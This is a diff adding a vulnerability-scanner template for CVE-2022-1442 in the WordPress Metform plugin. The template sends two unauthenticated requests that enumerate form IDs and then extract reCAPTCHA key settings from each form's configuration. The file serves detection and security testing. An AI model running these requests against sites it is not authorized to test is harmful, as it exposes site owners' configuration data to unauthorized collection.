@@ -1,0 +1,44 @@
+id: wordpress-metform-info-disclosure
+
+info:
+  name: WordPress Metform Plugin Information Disclosure (CVE-2022-1442)
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The WordPress Metform plugin has an information disclosure vulnerability in the core/forms/action.php file due to improper access control, allowing attackers to obtain sensitive information.
+  classification:
+    cve-id: CVE-2022-1442
+  tags: wordpress,info-leak
+
+http:
+  - raw:
+      - |
+        GET /wp-json/metform/v1/forms/templates/0 HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: form_ids
+        regex:
+          - '<option value="([0-9]+)"'
+        internal: true
+    matchers:
+      - type: word
+        words:
+          - "<option value="
+        part: body
+
+  - raw:
+      - |
+        GET /wp-json/metform/v1/forms/get/{{form_ids}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "mf_recaptcha_site_key"
+        part: body
+    extractors:
+      - type: regex
+        name: recaptcha_key
+        regex:
+          - '"mf_recaptcha_site_key":"(.*?)"'
